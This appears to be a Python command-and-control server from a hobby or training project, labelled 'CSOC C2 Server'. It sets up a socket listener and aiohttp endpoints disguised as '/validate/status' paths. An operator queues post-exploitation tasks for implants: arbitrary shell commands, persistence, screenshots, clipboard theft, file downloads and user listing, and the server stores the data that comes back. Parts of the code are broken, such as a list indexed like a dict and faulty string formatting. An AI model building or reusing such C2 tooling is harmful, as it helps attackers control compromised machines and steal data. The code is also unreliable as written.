import aiohttp
import pickle
from rich import print as rprint
from rich.table import Table
import threading
from aiohttp import web
from datetime import datetime
import time
import socket
import sys
import codecs

# list of active hosts
hosts = {'555.55.555.55' : 'active'}

# Holds post-exploitation commands for the target host that the operator will enter
commands = [] 

# HTTP server

file = open('duck.ansi', 'r')
duck = file.read()
file.close()

#===========SERVER CREATION=============
print('CSOC C2 Server')

HOST = "127.0.0.1"
PORT = 13337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)

def handle_connection(conn, ip):
    rprint(f"[bold green]Connected by {ip}")
    conn.send(duck.encode())
    msg = conn.recv(1024).decode()

    #act as echo server
    while msg != 'quit' and len(msg) != 0: 
        rprint("Received_data: [green]%s" % msg)


        # handle hosts command (show all hosts)
        # TODO if host is inactive show data in red if active green
        if msg == 'hosts':
            table = Table(title="Hosts", show_lines=True)
            table.add_column("IP", justify="left")
            table.add_column("Status")

            for i,j in hosts.items():
                table.add_row(i, j)

            # encodes obj to bytes to send over network
            pickled = codecs.encode(pickle.dumps(table), "base64")
            conn.send(pickled)

        else:
            conn.send(msg.encode())
            
        msg = conn.recv(1024).decode()
    conn.close()
    rprint("[red]Connection Closed: %s" %str(ip))


# def init_server():
while True:
    # create a dedicated thread for each incoming connection
    conn, addr = s.accept()
    t = threading.Thread(target=handle_connection, args=(conn, addr))
    t.start()


# readable, writable, exceptional = select.select(inputs, outputs, inputs)



# Initial checkin from the client (GET response)# 
async def InitCall(response):# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Request for C2 instructions from the client# 
async def CheckIn(request):# 
    commands.clear()# 
    peername = request.transport.get_extra_info('peername')# 
    host, port = peername# 
    cmdcounter = 0# 
    count2 = 0# 
    text = 'OK'# 
    # Allow the user to see the command options (Type 'options')# 
    while True:# 
        cmd = input("\033[34m[Source: %s]>>>\033[0m " % str(peername))# 
        if 'options' in cmd:# 
            print("-"*100)# 
            print("listdir: list files and directories")# 
            print("download [filename]: download file")# 
            print("listuser: list users")# 
            print("addresses: list internal addresses for this host")# 
            print("clipboard: grab text from user's clipboard")# 
            print("connections: show active network connections")# 
            print("screenshot: screenshot OS hosts")# 
            print("persistence: add persistence as agent")# 
            print("shell: run any shell command")# 
            print("sysinfo: show basic system information")# 
        elif "listdir" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "download" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "listuser" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "addresses" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "clipboard" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "connections" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "screenshot" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "persistence" in cmd:# 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "shell" in cmd:   # 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif "sysinfo" in cmd:   # 
            cmdcounter = cmdcounter + 1# 
            commands["'%s'"%str(cmdcounter)] = cmd# 
            print("\033[33m%s queued for execution on the endpoint at next checkin \033[0m " % cmd)# 
        elif cmd == 'done':# 
            datalist = list(commands.values())# 
            return web.json_response(datalist)# 
            break# 
        else:# 
            print("Command not found!")# 
        return web.Response(text=text)    
# 
# Client sending the screenshot image to the server to C2# 
async def GetScreenshot(request):# 
    s_data = await request.read()# 
    timestamp = datetime.now()# 
    print("Timestamp: %s" % str(timestamp))# 
    tstamp = datetime.now()# 
    with open("screenshot%s.jpg" & str(tstamp), 'wb') as sshot:# 
        sshot.write(s_data)# 
        sshot.close()# 
        print("Screenshot saved to current directory")# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending downloaded file to server to C2# 
async def GetDownload(request):# 
    d_data = await request.read()# 
    timestamp = datetime.now()# 
    print("Timestamp: %s" % str(timestamp))# 
    tstamp = datetime.now()# 
    with open("download%s.jpg" & str(tstamp), 'wb') as sshot:# 
        sshot.write(d_data)# 
        sshot.close()# 
        print("Screenshot saved to current directory")# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending List of directories of target to C2# 
async def ListDir(request):# 
    list_info = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    print('Results: \n%s' % str(list_info))# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending List of users of target to C2# 
async def Listusers(request):# 
    user_info = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    print('Local User Accounts Found: \n%s' % str(user_info))# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending addresses of target to C2# 
async def Addresses(request):# 
    address_info = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    print('%s' % str(address_info))# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending clipboard content downloaded in current directory # 
async def Clipboard(request):# 
    clip_info = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    with open("clipdata%s.txt" % str(timestamp), 'wb') as clip:# 
        clip.write(clip_info)# 
        clip.close# 
        print('Clipboard content downloaded in current directory.')# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending connection data of target# 
async def Conn(request):# 
    conn_data = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    print('%s' % str(conn_data))# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Persistence data # 
async def Persist(request):# 
    data = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    print('%s' % str(data))# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending shell command results of target# 
async def Shell(request):# 
    cmd_data = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    print('%s' % str(cmd_data))# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Client sending system information of the target# 
async def SysInfo(request):# 
    sysinfo_data = await request.read()# 
    timestamp = datetime.now()# 
    print('Timestamp: %s' % str(timestamp))# 
    print('Basic System Information:\r%s' % str(sysinfo_data))# 
    text = 'OK'# 
    return web.Response(text=text)
# 
# Create server endpoints:# 
app = web.Application()
# 
# Fomrmat: { web.[HTTP METHOD]('/[URL ENDPOINT]', [FUNCTION]) }# 
app.add_routes([web.get('/', InitCall),# 
                web.get('/validate/status', CheckIn),# 
                web.post('/validate/status/1', GetScreenshot),# 
                web.post('/validate/status/2', GetDownload),# 
                web.post('/validate/status/3', ListDir),# 
                web.post('/validate/status/4', Clipboard),# 
                web.post('/validate/status/5', Conn),# 
                web.post('/validate/status/6', Addresses),# 
                web.post('/validate/status/7', Listusers),# 
                web.post('/validate/status/8', SysInfo),# 
                web.post('/validate/status/9', Shell),# 
                web.post('/validate/status/10', Persist),# 
                web.post('/validate/status/11', Conn),                # 
])
# 
# Starting the Server# 
#if __name__ == '__main__':# 
#    web.run_app(app, port=80)
#    handle_connection(conn, addr)
    # 
# Type 'python actual_server.py' in command line to spin up server
